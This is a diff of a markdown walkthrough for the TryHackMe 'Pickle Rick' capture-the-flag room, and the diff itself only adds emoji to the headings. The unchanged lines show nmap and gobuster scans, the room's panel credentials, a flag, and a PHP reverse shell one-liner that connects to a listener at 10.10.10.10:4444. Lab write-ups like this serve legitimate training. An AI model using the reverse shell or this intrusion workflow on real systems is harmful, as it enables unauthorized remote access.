@@ -1,7 +1,7 @@
 ## Try Hack Me Pickle Rick (Easy)
 https://tryhackme.com/room/picklerick
 
-### 🧁nmap
+### 🧁nmap🧁
 ```
 nmap -Pn -sV -sT -T4 -A 10.10.164.54 -p- -vv
 ```
@@ -61,7 +61,7 @@ curl 10.10.164.54
 
 🚩Username: R1ckRul3s
 
-### 🧁gobuster
+### 🧁gobuster🧁
 ```
 gobuster dir -u http://10.10.164.54 -w common.txt -x html,shtml,php,jsp,zip,gz,tar,bk -t 50 -b 403,404
 ```
@@ -81,7 +81,7 @@ gobuster dir -u http://10.10.164.54 -w common.txt -x html,shtml,php,jsp,zip,gz,t
 
 ![image](https://user-images.githubusercontent.com/6504854/177176572-826a6985-115f-4064-a5c7-b254eb12d3fe.png)
 
-### 🧁web-shell
+### 🧁web-shell🧁
 Login Username:R1ckRul3s Pass:Wubbalubbadubdub
 use command panel
 ![image](https://user-images.githubusercontent.com/6504854/177176919-7d3ad620-c63e-4657-b49c-997c7f00143e.png)
@@ -97,7 +97,7 @@ php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("/bin/sh -i", array(
 
 ![image](https://user-images.githubusercontent.com/6504854/177181337-8bfd5398-00a7-434b-9b66-cea9241685bd.png)
 
-### 🧁flag
+### 🧁flag🧁
 ```
 cat Sup3rS3cretPickl3Ingred.txt
 mr. meeseek hair
